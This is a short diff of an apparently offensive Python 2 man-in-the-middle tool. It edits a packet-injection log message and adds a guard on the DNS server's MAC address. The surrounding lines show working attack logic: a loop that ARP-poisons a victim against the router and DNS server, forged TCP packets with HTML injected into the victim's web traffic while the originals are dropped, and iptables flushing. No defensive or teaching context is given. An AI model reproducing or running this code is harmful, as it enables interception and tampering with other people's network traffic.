@@ -278,8 +278,8 @@ class Parser():
 			del pkt[TCP].chksum
 			try:
 				send(pkt)
-				print R+'[!] Injected packet for '+W+self.html_url
-				logger.write('[!] Injected packet for '+self.html_url)
+				print R+'[!] Injected HTML into packet for '+W+self.html_url
+				logger.write('[!] Injected HTML into packet for '+self.html_url)
 				self.block_acks.append(ack)
 				payload.set_verdict(nfqueue.NF_DROP)
 				self.html_url = None
@@ -1002,7 +1002,7 @@ def main():
 		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
 		ipf.write('0\n')
 		ipf.close()
-		if not dnsIP == routerIP:
+		if not dnsIP == routerIP and dnsMAC:
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 		os.system('/sbin/iptables -F')
@@ -1016,7 +1016,7 @@ def main():
 
 	while 1:
 		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-		if not dnsIP == routerIP:
+		if not dnsIP == routerIP and dnsMAC:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
 		time.sleep(1.5)
